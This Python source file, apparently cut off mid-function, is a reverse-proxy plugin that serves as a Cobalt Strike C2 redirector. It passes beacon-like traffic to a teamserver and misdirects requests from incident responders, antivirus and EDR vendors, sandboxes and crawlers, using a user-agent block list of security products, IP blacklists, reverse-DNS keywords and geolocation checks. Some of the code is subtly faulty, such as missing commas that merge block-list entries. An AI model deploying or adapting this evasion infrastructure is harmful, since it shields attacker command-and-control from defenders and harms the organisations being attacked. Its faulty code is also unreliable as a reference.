#!/usr/bin/python3
#
# This script acts as a HTTP/HTTPS reverse-proxy with several restrictions imposed upon which
# requests and from whom it should process, similarly to the .htaccess file in Apache2's mod_rewrite.
#
# malleable_redirector was created to resolve the problem of effective IR/AV/EDRs/Sandboxes evasion on the
# C2 redirector's backyard. 
#
# The proxy along with this plugin can both act as a CobaltStrike Teamserver C2 redirector, given Malleable C2
# profile used during the campaign and teamserver's hostname:port. The plugin will parse supplied malleable profile
# in order to understand which inbound requests may possibly come from the compatible Beacon or are not compliant with
# the profile and therefore should be misdirected. Sections such as http-stager, http-get, http-post and their corresponding 
# uris, headers, prepend/append patterns, User-Agent are all used to distinguish between legitimate beacon's request
# and some Internet noise or IR/AV/EDRs out of bound inquiries. 
#
# The plugin was also equipped with marvelous known bad IP ranges coming from:
#   curi0usJack and the others:
#   https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10
#
# Using a IP addresses blacklist along with known to be bad keywords lookup on Reverse-IP DNS queries and HTTP headers,
# is considerably increasing plugin's resiliency to the unauthorized peers wanting to examine protected infrastructure.
#
# Use wisely, stay safe.
#
# Example usage:
#   $ python3 proxy2.py -P 80/http -P 443/https -p plugins/malleable_redirector.py --config malleable-redir-config.yml
#
#   [INFO] 19:21:42: Loading 1 plugin...
#   [INFO] 19:21:42: Plugin "malleable_redirector" has been installed.
#   [INFO] 19:21:42: Preparing SSL certificates and keys for https traffic interception...
#   [INFO] 19:21:42: Using provided CA key file: ca-cert/ca.key
#   [INFO] 19:21:42: Using provided CA certificate file: ca-cert/ca.crt
#   [INFO] 19:21:42: Using provided Certificate key: ca-cert/cert.key
#   [INFO] 19:21:42: Serving http proxy on: 0.0.0.0, port: 80...
#   [INFO] 19:21:42: Serving https proxy on: 0.0.0.0, port: 443...
#   [INFO] 19:21:42: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:42: == Valid malleable http-get request inbound.
#   [INFO] 19:21:42: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:42: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:45: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:45: == Valid malleable http-get request inbound.
#   [INFO] 19:21:45: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#   [INFO] 19:21:45: [RESPONSE] HTTP 200 OK, length: 5543
#   [INFO] 19:21:46: [REQUEST] GET /
#   [ERROR] 19:21:46: [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [INFO] 19:21:46: [RESPONSE] HTTP 301 Moved Permanently, length: 212
#   [INFO] 19:21:48: [REQUEST] GET /jquery-3.3.1.min.js
#   [INFO] 19:21:48: == Valid malleable http-get request inbound.
#   [INFO] 19:21:48: Plugin redirected request from [code.jquery.com] to [1.2.3.4:8080]
#
# The above output contains a line pointing out that there has been an unauthorized, not compliant with our C2 
# profile inbound request, which got dropped due to incompatible User-Agent string presented:
#   [...]
#   [DROP, reason:1] inbound User-Agent differs from the one defined in C2 profile.
#   [...]
#
# Requirements:
#   - brotli
#   - yaml
#
# Author:
#   Mariusz B. / mgeeky, '20
#   <mb@binary-offensive.com>
#

import re, sys
import os
import hashlib
import socket
import pprint
import requests
import random
import os.path
import ipaddress
import yaml, json

from urllib.parse import urlparse, parse_qsl, parse_qs, urlsplit
from IProxyPlugin import *
from sqlitedict import SqliteDict
from datetime import datetime


BANNED_AGENTS = (
    # Dodgy User-Agents words
    'curl', 'wget', 'python-urllib', 'lynx', 'slackbot-linkexpanding'

    # Generic bad words
    'security', 'scanning', 'scanner', 'defender', 'cloudfront', 'appengine-google'

    # Bots
    'googlebot', 'adsbot-google', 'msnbot', 'altavista', 'slurp', 'mj12bot',
    'bingbot', 'duckduckbot', 'baiduspider', 'yandexbot', 'simplepie', 'sogou',
    'exabot', 'facebookexternalhit', 'ia_archiver', 'virustotalcloud', 'virustotal'

    # EDRs
    'bitdefender', 'carbonblack', 'carbon', 'code42', 'countertack', 'countercept', 
    'crowdstrike', 'cylance', 'druva', 'forcepoint', 'ivanti', 'sentinelone', 
    'trend micro', 'gravityzone', 'trusteer', 'cybereason', 'encase', 'ensilo', 
    'huntress', 'bluvector', 'cynet360', 'endgame', 'falcon', 'fortil', 'gdata', 
    'lightcyber', 'secureworks', 'apexone', 'emsisoft', 'netwitness', 'fidelis', 

    # AVs
    'acronis', 'adaware', 'aegislab', 'ahnlab', 'antiy', 'secureage', 
    'arcabit', 'avast', 'avg', 'avira', 'bitdefender', 'clamav', 
    'comodo', 'crowdstrike', 'cybereason', 'cylance', 'cyren', 
    'drweb', 'emsisoft', 'endgame', 'escan', 'eset', 'f-secure', 
    'fireeye', 'fortinet', 'gdata', 'ikarussecurity', 'k7antivirus', 
    'k7computing', 'kaspersky', 'malwarebytes', 'mcafee', 'nanoav', 
    'paloaltonetworks', 'panda', '360totalsecurity', 'sentinelone', 
    'sophos', 'symantec', 'tencent', 'trapmine', 'trendmicro', 'virusblokada', 
    'anti-virus', 'antivirus', 'yandex', 'zillya', 'zonealarm', 
    'checkpoint', 'baidu', 'kingsoft', 'superantispyware', 'tachyon', 
    'totaldefense', 'webroot', 'egambit', 'trustlook'

    # Other proxies, sandboxes etc
    'zscaler', 'barracuda', 'sonicwall', 'f5 network', 'palo alto network', 'juniper', 'check point'
)

class IPLookupHelper:
    supported_providers = (
        'ipapi_co',
        'ip_api_com',
        'ipgeolocation_io',
    )

    cached_lookups_file = 'ip-lookups-cache.json'

    def __init__(self, logger, apiKeys):
        self.logger = logger
        self.apiKeys = {
            'ip_api_com': 'this-provider-not-requires-api-key-for-free-plan',
            'ipapi_co': 'this-provider-not-requires-api-key-for-free-plan',
        }

        if len(apiKeys) > 0:
            for prov in IPLookupHelper.supported_providers:
                if prov in apiKeys.keys():
                    if apiKeys[prov] == None or len(apiKeys[prov].strip()) < 2: continue
                    self.apiKeys[prov] = apiKeys[prov].strip()

        self.cachedLookups = {}

        self.logger.dbg('Following IP Lookup providers will be used: ' + str(list(self.apiKeys.keys())))

        try:
            with open(IPLookupHelper.cached_lookups_file) as f:
                data = f.read()
                if len(data) > 0:
                    cached = json.loads(data)
                    self.cachedLookups = cached
                    self.logger.dbg(f'Read {len(cached)} cached entries from file.')

        except json.decoder.JSONDecodeError as e:
            self.logger.err(f'Corrupted JSON data in cache file: {IPLookupHelper.cached_lookups_file}! Error: {e}')
            raise

        except FileNotFoundError as e:
            with open(IPLookupHelper.cached_lookups_file, 'w') as f:
                json.dump({}, f)

        except Exception as e:
            self.logger.err(f'Exception raised while loading cached lookups from file ({IPLookupHelper.cached_lookups_file}: {e}')
            raise

    def lookup(self, ipAddress):
        if len(self.apiKeys) == 0:
            return {}

        if ipAddress in self.cachedLookups.keys():
            self.logger.dbg(f'Returning cached entry for IP address: {ipAddress}')
            return self.cachedLookups[ipAddress]

        leftProvs = list(self.apiKeys.keys())
        result = {}

        while len(leftProvs) > 0:
            prov = random.choice(leftProvs)

            if hasattr(self, prov) != None:
                method = getattr(self, prov)
                self.logger.dbg(f'Calling IP Lookup provider: {prov}')
                result = method(ipAddress)

                if len(result) > 0:
                    result = self.normalizeResult(result)
                    break

                leftProvs.remove(prov)

        if len(result) > 0:
            self.cachedLookups[ipAddress] = result

            with open(IPLookupHelper.cached_lookups_file, 'w') as f:
                json.dump(self.cachedLookups, f)

            self.logger.dbg(f'New IP lookup entry cached: {ipAddress}')

        return result

    def normalizeResult(self, result):
        # Returns JSON similar to the below:
        # {
        #   "organization": [
        #     "Tinet SpA",
        #     "Zscaler inc.",
        #     "AS62044 Zscaler Switzerland GmbH"
        #   ],
        #   "continent": "Europe",
        #   "country": "Germany",
        #   "continent_code": "EU",
        #   "ip": "89.167.131.40",
        #   "city": "Frankfurt am Main",
        #   "timezone": "Europe/Berlin",
        #   "fulldata": {
        #     "status": "success",
        #     "country": "Germany",
        #     "countryCode": "DE",
        #     "region": "HE",
        #     "regionName": "Hesse",
        #     "city": "Frankfurt am Main",
        #     "zip": "60314",
        #     "lat": 50.1103,
        #     "lon": 8.7147,
        #     "timezone": "Europe/Berlin",
        #     "isp": "Zscaler inc.",
        #     "org": "Tinet SpA",
        #     "as": "AS62044 Zscaler Switzerland GmbH",
        #     "query": "89.167.131.40"
        #   }
        # }

        def update(out, data, keydst, keysrc):
            if keysrc in data.keys(): 
                if type(out[keydst]) == list: out[keydst].append(data[keysrc])
                else: out[keydst] = data[keysrc]

        output = {
            'organization' : [],
            'continent' : '',
            'continent_code' : '',
            'country' : '',
            'country_code' : '',
            'ip' : '',
            'city' : '',
            'timezone' : '',
            'fulldata' : {}
        }

        continentCodeToName = {
            'AF' : 'Africa',
            'AN' : 'Antarctica',
            'AS' : 'Asia',
            'EU' : 'Europe',
            'NA' : 'North america',
            'OC' : 'Oceania',
            'SA' : 'South america'
        }

        output['fulldata'] = result

        update(output, result, 'organization', 'org')
        update(output, result, 'organization', 'isp')
        update(output, result, 'organization', 'as')
        update(output, result, 'organization', 'organization')
        update(output, result, 'ip', 'ip')
        update(output, result, 'ip', 'query')
        update(output, result, 'timezone', 'timezone')
        if 'time_zone' in result.keys():
            update(output, result['time_zone'], 'timezone', 'name')
        update(output, result, 'city', 'city')

        update(output, result, 'country', 'country_name')
        if ('country' not in output.keys() or output['country'] == '') and \
            ('country' in result.keys() and result['country'] != ''):
            update(output, result, 'country', 'country')

        update(output, result, 'country_code', 'country_code')
        if ('country_code' not in output.keys() or output['country_code'] == '') and \
            ('country_code2' in result.keys() and result['country_code2'] != ''):
            update(output, result, 'country_code', 'country_code2')

        update(output, result, 'country_code', 'countryCode')

        update(output, result, 'continent', 'continent')
        update(output, result, 'continent', 'continent_name')
        update(output, result, 'continent_code', 'continent_code')

        if ('continent_code' not in result.keys() or result['continent_code'] == '') and \
            ('continent_name' in result.keys() and result['continent_name'] != ''):
            cont = result['continent_name'].lower()
            for k, v in continentCodeToName.items():
                if v.lower() == cont:
                    output['continent_code'] = k
                    break

        elif ('continent_code' in result.keys() and result['continent_code'] != '') and \
            ('continent_name' not in result.keys() or result['continent_name'] == ''):
            output['continent'] = continentCodeToName[result['continent_code'].upper()]
        
        elif 'timezone' in result.keys() and result['timezone'] != '':
            cont = result['timezone'].split('/')[0].strip().lower()
            for k, v in continentCodeToName.items():
                if v.lower() == cont:
                    output['continent_code'] = k
                    output['continent'] = v
                    break

        return output

    def ip_api_com(self, ipAddress):
        # $ curl -s ip-api.com/json/89.167.131.40                                                                                                                  [21:05]
        # {
        #   "status": "success",
        #   "country": "Germany",
        #   "countryCode": "DE",
        #   "region": "HE",
        #   "regionName": "Hesse",
        #   "city": "Frankfurt am Main",
        #   "zip": "60314",
        #   "lat": 50.1103,
        #   "lon": 8.7147,
        #   "timezone": "Europe/Berlin",
        #   "isp": "Zscaler inc.",
        #   "org": "Tinet SpA",
        #   "as": "AS62044 Zscaler Switzerland GmbH",
        #   "query": "89.167.131.40"
        # }

        try:
            r = requests.get(f'http://ip-api.com/json/{ipAddress}')

            if r.status_code != 200:
                raise Exception(f'ip-api.com returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ip-api.com with {ipAddress}:\nName: {e}')

        return {}

    def ipapi_co(self, ipAddress):
        # $ curl 'https://ipapi.co/89.167.131.40/json/' 
        # {
        #    "ip": "89.167.131.40",
        #    "city": "Frankfurt am Main",
        #    "region": "Hesse",
        #    "region_code": "HE",
        #    "country": "DE",
        #    "country_code": "DE",
        #    "country_code_iso3": "DEU",
        #    "country_capital": "Berlin",
        #    "country_tld": ".de",
        #    "country_name": "Germany",
        #    "continent_code": "EU",
        #    "in_eu": true,
        #    "postal": "60314",
        #    "latitude": 50.1103,
        #    "longitude": 8.7147,
        #    "timezone": "Europe/Berlin",
        #    "utc_offset": "+0200",
        #    "country_calling_code": "+49",
        #    "currency": "EUR",
        #    "currency_name": "Euro",
        #    "languages": "de",
        #    "country_area": 357021.0,
        #    "country_population": 81802257.0,
        #    "asn": "AS62044",
        #    "org": "Zscaler Switzerland GmbH"
        # }

        try:
            r = requests.get(f'https://ipapi.co/{ipAddress}/json/')

            if r.status_code != 200:
                raise Exception(f'ipapi.co returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ipapi.co with {ipAddress}:\nName: {e}')

        return {}

    def ipgeolocation_io(self, ipAddress):
        # $ curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY&ip=89.167.131.40'
        # {
        #   "ip": "89.167.131.40",
        #   "continent_code": "EU",
        #   "continent_name": "Europe",
        #   "country_code2": "DE",
        #   "country_code3": "DEU",
        #   "country_name": "Germany",
        #   "country_capital": "Berlin",
        #   "state_prov": "Hesse",
        #   "district": "Innenstadt III",
        #   "city": "Frankfurt am Main",
        #   "zipcode": "60314",
        #   "latitude": "50.12000",
        #   "longitude": "8.73527",
        #   "is_eu": true,
        #   "calling_code": "+49",
        #   "country_tld": ".de",
        #   "languages": "de",
        #   "country_flag": "https://ipgeolocation.io/static/flags/de_64.png",
        #   "geoname_id": "6946227",
        #   "isp": "Tinet SpA",
        #   "connection_type": "",
        #   "organization": "Zscaler Switzerland GmbH",
        #   "currency": {
        #     "code": "EUR",
        #     "name": "Euro",
        #     "symbol": "€"
        #   },
        #   "time_zone": {
        #     "name": "Europe/Berlin",
        #     "offset": 1,
        #     "current_time": "2020-07-29 22:31:23.293+0200",
        #     "current_time_unix": 1596054683.293,
        #     "is_dst": true,
        #     "dst_savings": 1
        #   }
        # }
        try:
            r = requests.get(f'https://api.ipgeolocation.io/ipgeo?apiKey={self.apiKeys["ipgeolocation_io"]}&ip={ipAddress}')

            if r.status_code != 200:
                raise Exception(f'ipapi.co returned unexpected status code: {r.status_code}.\nOutput text:\n' + r.json())

            return r.json()

        except Exception as e:
            self.logger.err(f'Exception catched while querying ipapi.co with {ipAddress}:\nName: {e}')

        return {}

class IPGeolocationDeterminant:
    supported_determinants = (
        'organization',
        'continent',
        'continent_code',
        'country',
        'country_code',
        'city',
        'timezone'
    )

    def __init__(self, logger, determinants):
        self.logger = logger
        if type(determinants) != dict:
            raise Exception('Specified ip_geolocation_requirements must be a valid dictonary!')

        self.determinants = {}

        for k, v in determinants.items():
            k = k.lower()
            if k in IPGeolocationDeterminant.supported_determinants:
                if type(v) == str:   
                    self.determinants[k] = [v, ]
                elif type(v) == list or type(v) == tuple:
                    self.determinants[k] = v
                elif type(v) == type(None):
                    self.determinants[k] = []
                else:
                    raise Exception(f'Specified ip_geolocation_requirements[{k}] must be either string or list! Unknown type met: {type(v)}')

                for i in range(len(self.determinants[k])):
                    if self.determinants[k][i] == None:
                        self.determinants[k][i] = ''

    def determine(self, ipLookupResult):
        if type(ipLookupResult) != dict or len(ipLookupResult) == 0:
            raise Exception(f'Given IP geolocation results object was either empty or not a dictionary: {ipLookupResult}!')

        result = True
        checked = 0

        for determinant, expected in self.determinants.items():
            if len(expected) == 0 or sum([len(x) for x in expected]) == 0: continue

            if determinant in ipLookupResult.keys():
                checked += 1
                matched = False

                for georesult in ipLookupResult[determinant]:
                    georesult = georesult.lower()

                    for exp in expected:
                        if georesult in exp.lower():
                            self.logger.dbg(f'IP Geo result {determinant} value "{georesult}" met expected value "{exp}"')
                            matched = True
                            break

                        m = re.search(exp, georesult, re.I)
                        if m:
                            self.logger.dbg(f'IP Geo result {determinant} value "{georesult}" met expected regular expression: ({exp})')
                            matched = True
                            break    

                    if matched: 
                        break                    

                if not matched:
                    self.logger.dbg(f'IP Geo result {determinant} values {ipLookupResult[determinant]} DID NOT met expected set {expected}')
                    result = False

        return result


class MalleableParser:
    ProtocolTransactions = ('http-stager', 'http-get', 'http-post')
    TransactionBlocks = ('metadata', 'id', 'output')
    UriParameters = ('uri', 'uri_x86', 'uri_x64')
    CommunicationParties = ('client', 'server')

    GlobalOptionsDefaults = {
        'data_jitter': "0",
        'dns_idle': "0.0.0.0",
        'dns_max_txt': "252",
        'dns_sleep': "0",
        'dns_stager_prepend': "",
        'dns_stager_subhost': ".stage.123456.",
        'dns_ttl': "1",
        'headers_remove': "",
        'host_stage': "true",
        'jitter': "0",
        'maxdns': "255",
        'pipename': "msagent_##",
        'pipename_stager': "status_##",
        'sample_name': "My Profile",
        'sleeptime': "60000",
        'smb_frame_header': "",
        'ssh_banner': "Cobalt Strike 4.2",
        'ssh_pipename': "postex_ssh_####",
        'tcp_frame_header': "",
        'tcp_port': "4444",
        'useragent': "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    }

    def __init__(self, logger):
        self.path = ''
        self.data = ''
        self.datalines = []
        self.logger = logger
        self.parsed = {}
        self.config = self.parsed
        self.variants = []

    def get_config(self):
        return self.config

    def parse(self, path):
        try:
            with open(path, 'r') as f:
                self.data = f.read().replace('\r\n', '\n')
                self.datalines = self.data.split('\n')

        except FileNotFoundError as e:
            self.logger.fatal("Malleable profile specified in redirector's config file (profile) doesn't exist: ({})".format(path))

        pos = 0
        linenum = 0
        depth = 0
        dynkey = []
        parsed = self.parsed

        regexes = {
            # Finds: set name "value";
            'set-name-value' : r"\s*set\s+(\w+)\s+(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w))).*",
            
            # Finds: section { as well as variant-driven: section "variant" {
            'begin-section-and-variant' : r'^\s*([\w-]+)(\s+"[^"]+")?\s*\{\s*',

            # Finds: [set] parameter ["value", ...];
            'set-parameter-value' : r'(?:([\w-]+)\s+(?=")".*")|(?:([\w-]+)(?=;))',

            # Finds: prepend "something"; and append "something";
            'prepend-append-value' : r'\s*(prepend|append)\s*"([^"\\]*(?:\\.[^"\\]*)*)"',
            
            'parameter-value' : r"(?=(?:(?<!\w)'(\S.*?)'(?!\w)|\"(\S.*?)\"(?!\w)))",
        }

        compregexes = {}

        for k, v in regexes.items():
            compregexes[k] = re.compile(v, re.I)

        while linenum < len(self.datalines):
            line = self.datalines[linenum]

            assert len(dynkey) == depth, "Depth ({}) and dynkey differ ({})".format(depth, dynkey)

            if line.strip() == '': 
                pos += len(line)
                linenum += 1
                continue

            if line.lstrip().startswith('#'): 
                pos += len(line) + 1
                linenum += 1
                continue

            if len(line) > 100:
                self.logger.dbg('[key: {}, line: {}, pos: {}] {}...{}'.format(str(dynkey), linenum, pos, line[:50], line[-50:]))
            else:
                self.logger.dbg('[key: {}, line: {}, pos: {}] {}'.format(str(dynkey), linenum, pos, line[:100]))

            parsed = self.parsed
            for key in dynkey:
                sect, variant = key
                if len(variant) > 0:
                    parsed = parsed[sect][variant]
                else:
                    parsed = parsed[sect]

            matched = False

            m = compregexes['begin-section-and-variant'].match(line)
            twolines = self.datalines[linenum]

            if len(self.datalines) >= linenum+1:
                twolines += self.datalines[linenum+1]

            n = compregexes['begin-section-and-variant'].match(twolines)
            if m or n:
                if m == None and n != None: 
                    self.logger.dbg('Section opened in a new line: [{}] = ["{}"]'.format(
                        n.group(1), 
                        twolines.replace('\r', "\\r").replace('\n', "\\n")
                    ))
                    linenum += 1
                    pos += len(self.datalines[linenum])
                    m = n

                depth += 1
                section = m.group(1)
                variant = ''

                if section not in parsed.keys():
                    parsed[section] = {}

                if m.group(2) is not None:
                    variant = m.group(2).strip().replace('"', '')
                    parsed[section][variant] = {}
                    parsed[section]['variant'] = variant

                elif section in MalleableParser.ProtocolTransactions:
                    variant = 'default'
                    parsed[section][variant] = {}
                    parsed[section]['variant'] = variant

                else:
                    parsed[section] = {}

                if len(variant) > 0 and variant not in self.variants:
                    self.variants.append(variant)
                
                self.logger.dbg('Extracted section: [{}] (variant: {})'.format(section, variant))

                dynkey.append((section, variant))

                matched = 'section'
                pos += len(line)
                linenum += 1
                continue

            if line.strip() == '}':
                depth -= 1
                matched = 'endsection'
                sect, variant = dynkey.pop()
                variant = ''

                if sect in parsed.keys() and 'variant' in parsed[sect][variant].keys():
                    variant = '(variant: {})'.format(variant)

                self.logger.dbg('Reached end of section {}.{}'.format(sect, variant))
                pos += len(line)
                linenum += 1
                continue

            m = compregexes['set-name-value'].match(line)
            if m:
                n = list(filter(lambda x: x != None, m.groups()[2:]))[0]
                
                val = n.replace('\\\\', '\\')
                param = m.group(1)

                if param.lower() == 'uri' or param.lower() == 'uri_x86' or param.lower() == 'uri_x64':
                    parsed[param] = val.split(' ')
                    self.logger.dbg('Multiple URIs defined: [{}] = [{}]'.format(param, ', '.join(val.split(' '))))

                else:
                    parsed[param] = val
                    self.logger.dbg('Extracted variable: [{}] = [{}]'.format(param, val))

                matched = 'set'
                pos += len(line)
                linenum += 1
                continue

            # Finds: [set] parameter ["value", ...];
            m = compregexes['set-parameter-value'].search(line)
            if m:
                paramname = list(filter(lambda x: x != None, m.groups()))[0]
                restofline = line[line.find(paramname) + len(paramname):]
                values = []

                n = compregexes['prepend-append-value'].search(line)
                if n != None and len(n.groups()) > 1:
                    paramname = n.groups()[0]
                    paramval = n.groups()[1].replace('\\\\', '\\')
                    values.append(paramval)
                    self.logger.dbg('Extracted {} value: "{}..."'.format(paramname, paramval[:20]))

                else: 
                    for n in compregexes['parameter-value'].finditer(restofline):
                        paramval = list(filter(lambda x: x != None, n.groups()[1:]))[0]
                        values.append(paramval.replace('\\\\', '\\'))

                if values == []:
                    values = ''
                elif len(values) == 1:
                    values = values[0]

                if paramname in parsed.keys():
                    if type(parsed[paramname]) == list:
                        parsed[paramname].append(values)
                    else:
                        parsed[paramname] = [parsed[paramname], values]
                else:
                    if type(values) == list:
                        parsed[paramname] = [values, ]
                    else:
                        parsed[paramname] = values

                self.logger.dbg('Extracted complex variable: [{}] = [{}]'.format(paramname, str(values)[:100]))

                matched = 'complexset'
                pos += len(line)
                linenum += 1
                continue

            a = linenum
            b = linenum+1

            if a > 5: a -= 5

            if b > len(self.datalines): b = len(self.datalines)
            elif b < len(self.datalines) + 5: b += 5

            self.logger.err("Unexpected statement:\n\t{}\n\n----- Context -----\n\n{}\n".format(
                line,
                '\n'.join(self.datalines[a:b])
                ))

            self.logger.err("\nParsing failed.")
            return False

        self.normalize()
        return True

    def normalize(self):
        for k, v in self.config.items():
            if k in MalleableParser.ProtocolTransactions:
                if k == 'http-get' and 'verb' not in self.config[k].keys():
                    self.config[k]['verb'] = 'GET'
                elif k == 'http-post' and 'verb' not in self.config[k].keys():
                    self.config[k]['verb'] = 'POST'

                for a in MalleableParser.CommunicationParties:
                    if a not in self.config[k]:
                        self.config[k][a] = {
                            'header' : [],
                            'variant' : 'default',
                        }
                    else:
                        if 'header' not in self.config[k][a].keys(): self.config[k][a]['header'] = []
                        if 'variant' not in self.config[k][a].keys(): self.config[k][a]['variant'] = 'default'

        for k, v in MalleableParser.GlobalOptionsDefaults.items():
            if k.lower() not in self.config.keys():
                self.config[k] = v
                self.logger.dbg('MalleableParser: Global variable ({}) not defined. Setting default value of: "{}"'.format(k, v))


class ProxyPlugin(IProxyPlugin):
    class AlterHostHeader(Exception):
        pass

    RequestsHashesDatabaseFile = '.anti-replay.sqlite'
    DynamicWhitelistFile = '.dynamic-whitelist.sqlite'

    DefaultRedirectorConfig = {
        'profile' : '',
        #'teamserver_url' : [],
        'drop_action': 'redirect',
        'action_url': ['https://google.com', ],
        'proxy_pass': [],
        'log_dropped': False,
        'report_only': False,
        'ban_blacklisted_ip_addresses': True,
        'ip_addresses_blacklist_file': 'plugins/malleable_banned_ips.txt',
        'mitigate_replay_attack': False,
        'whitelisted_ip_addresses' : [],
        'protect_these_headers_from_tampering' : [],
        'verify_peer_ip_details': True,
        'remove_superfluous_headers': True,
        'ip_details_api_keys': {},
        'ip_geolocation_requirements': {},
        'add_peers_to_whitelist_if_they_sent_valid_requests' : {
            'number_of_valid_http_get_requests': 15,
            'number_of_valid_http_post_requests': 5
        },
        'policy': {
            'allow_proxy_pass' : True,
            'allow_dynamic_peer_whitelisting' : True,
            'drop_invalid_useragent' : True,
            'drop_http_banned_header_names' : True,
            'drop_http_banned_header_value' : True,
            'drop_dangerous_ip_reverse_lookup' : True,
            'drop_malleable_without_expected_header' : True,
            'drop_malleable_without_expected_header_value' : True,
            'drop_malleable_without_expected_request_section' : True,
            'drop_malleable_without_request_section_in_uri' : True,
            'drop_malleable_without_prepend_pattern' : True,
            'drop_malleable_without_apppend_pattern' : True,
            'drop_malleable_unknown_uris' : True,
            'drop_malleable_with_invalid_uri_append' : True,
        }
    }

    def __init__(self, logger, proxyOptions):
        self.is_request = False
        self.logger = logger
        self.addToResHeaders = {}
        self.proxyOptions = proxyOptions
        self.malleable = None
        self.ipLookupHelper = None
        self.ipGeolocationDeterminer = None

        self.banned_ips = {}

        open(ProxyPlugin.DynamicWhitelistFile, 'w').close()
        with SqliteDict(ProxyPlugin.DynamicWhitelistFile, autocommit=True) as mydict:
            mydict['whitelisted_ips'] = []


    @staticmethod
    def get_name():
        return 'malleable_redirector'

    def drop_reason(self, text):
        self.logger.err(text)
        if not self.proxyOptions['report_only']:
            if 'X-Drop-Reason' in self.addToResHeaders.keys():
                self.addToResHeaders['X-Drop-Reason'] += '; ' + text
            else:
                self.addToResHeaders['X-Drop-Reason'] = text

    def help(self, parser):
        parametersRequiringDirectPath = (
            'ip_addresses_blacklist_file',
            'profile'
        )

        if parser != None:
            parser.add_argument('--redir-config', 
                metavar='PATH', dest='redir_config',
                help='Path to the malleable-redirector\'s YAML config file. Not required if global proxy\'s config file was specified (--config) and includes options required by this plugin.'
            )

        else:
            if not self.proxyOptions['config'] and not self.proxyOptions['redir_config']:
                self.logger.fatal('Malleable-redirector config file not specified (--redir-config)!')

            redirectorConfig = {}
            configBasePath = ''
            try:
                if not self.proxyOptions['config'] and self.proxyOptions['redir_config'] != '':
                    with open(self.proxyOptions['redir_config']) as f:
                        #redirectorConfig = yaml.load(f, Loader=yaml.FullLoader)
                        redirectorConfig = yaml.load(f)

                    self.proxyOptions.update(redirectorConfig)

                    for k, v in ProxyPlugin.DefaultRedirectorConfig.items():
                        if k not in self.proxyOptions.keys():
                            self.proxyOptions[k] = v

                    configBasePath = os.path.dirname(os.path.abspath(self.proxyOptions['redir_config']))
                else:
                    configBasePath = os.path.dirname(os.path.abspath(self.proxyOptions['config']))

                self.ipLookupHelper = IPLookupHelper(self.logger, self.proxyOptions['ip_details_api_keys'])
                self.ipGeolocationDeterminer = IPGeolocationDeterminant(self.logger, self.proxyOptions['ip_geolocation_requirements'])

                for paramName in parametersRequiringDirectPath:
                    if paramName in self.proxyOptions.keys() and \
                        self.proxyOptions[paramName] != '' and self.proxyOptions[paramName] != None:
                        self.proxyOptions[paramName] = os.path.join(configBasePath, self.proxyOptions[paramName])

            except FileNotFoundError as e:
                self.logger.fatal(f'Malleable-redirector config file not found: ({self.proxyOptions["config"]})!')

            except Exception as e:
                self.logger.fatal(f'Unhandled exception occured while parsing Malleable-redirector config file: {e}')

            if ('profile' not in self.proxyOptions.keys()) or (not self.proxyOptions['profile']):
                self.logger.err('''

==============================================================================================
 MALLEABLE C2 PROFILE PATH NOT SPECIFIED! LOGIC BASED ON PARSING HTTP REQUESTS WON\'T BE USED!
==============================================================================================
''')
                self.malleable = None

            else:
                self.malleable = MalleableParser(self.logger)

                self.logger.dbg(f'Parsing input Malleable profile: ({self.proxyOptions["profile"]})')
                if not self.malleable.parse(self.proxyOptions['profile']):
                    self.logger.fatal('Could not parse specified Malleable C2 profile!')

            if not self.proxyOptions['action_url'] or len(self.proxyOptions['action_url']) == 0:
                self.logger.fatal('Action/Drop URL must be specified!')

            elif type(self.proxyOptions['action_url']) == str:
                url = self.proxyOptions['action_url']
                if ',' not in url:
                    self.proxyOptions['action_url'] = [url.strip(), ]
                else:
                    self.proxyOptions['action_url'] = [x.strip() for x in url.split(',')]

            if (type(self.proxyOptions['proxy_pass']) != list) and \
                (type(self.proxyOptions['proxy_pass']) != tuple):
                self.logger.fatal('Proxy Pass must be a list of entries if specified!')
            else:
                passes = []
                for entry in self.proxyOptions['proxy_pass']:
                    entry = entry.strip()

                    if len(entry) < 6:
                        self.logger.fatal('Invalid Proxy Pass entry: ({}): too short!',format(entry))

                    url = ''
                    host = ''

                    if len(entry.split(' ')) > 2:
                        self.logger.fatal('Invalid Proxy Pass entry: ({}): entry contains more than one space character breaking </url host> syntax! Neither URL nor host can contain space.'.format(entry))
                    else:
                        (url, host) = entry.split(' ')
                        url = url.strip()
                        host = host.strip().replace('https://', '').replace('http://', '').replace('/', '')

                    if len(url) == 0 or len(host) < 4:
                        self.logger.fatal('Invalid Proxy Pass entry: (url="{}" host="{}"): either URL or host part were missing or too short (schema is ignored).',format(url, host))

                    if not url.startswith('/'):
                        self.logger.fatal('Invalid Proxy Pass entry: (url="{}" host="{}"): URL must start with slash character (/).',format(url, host))

                    passes.append((url, host))
                    self.logger.info('Will proxy-pass requests targeted to: "^{}$" onto host: "{}"'.format(url, host))

                if len(passes) > 0:
                    self.proxyOptions['proxy_pass'] = passes[:]
                    self.logger.info('Collected {} proxy-pass statements.'.format(len(passes)))

            if not self.proxyOptions['teamserver_url']:
                self.logger.fatal('Teamserver URL must be specified!')

            if type(self.proxyOptions['teamserver_url']) == str:
                self.proxyOptions['teamserver_url'] = [self.proxyOptions['teamserver_url'], ]

            try:
                inports = []
                for ts in self.proxyOptions['teamserver_url']:
                    inport, scheme, host, port = self.interpretTeamserverUrl(ts)
                    if inport != 0: inports.append(inport)

                    o = ''
                    if port < 1 or port > 65535: raise Exception()
                    if inport != 0:
                        if inport < 1 or inport > 65535: raise Exception()
                        o = 'originating from {} '.format(inport)

                    self.logger.dbg('Will pass inbound beacon traffic {}to {}{}:{}'.format(
                        o, scheme+'://' if len(scheme) else '', host, port
                    ))

